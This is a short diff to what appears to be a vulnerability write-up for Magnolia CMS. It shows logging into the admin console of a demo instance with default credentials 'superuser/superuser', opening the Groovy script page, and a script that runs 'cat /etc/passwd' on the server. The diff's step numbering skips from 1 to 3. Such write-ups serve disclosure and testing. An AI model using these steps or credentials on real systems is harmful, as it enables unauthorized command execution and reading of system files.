@@ -7,9 +7,10 @@
 
 
 1) Authenticate as an admin:  
-   `https://demoauthor.magnolia-cms.com/.magnolia/admincentral`  
-2) Navigate to **Development > Groovy > Add Script**  
-3) Inject Groovy Script:
+   `https://demoauthor.magnolia-cms.com/.magnolia/admincentral
+   Username: superuser Password: superuser`  
+3) Navigate to **Development > Groovy > Add Script**  
+4) Inject Groovy Script:
 
 ```groovy
 def process = "cat /etc/passwd".execute()
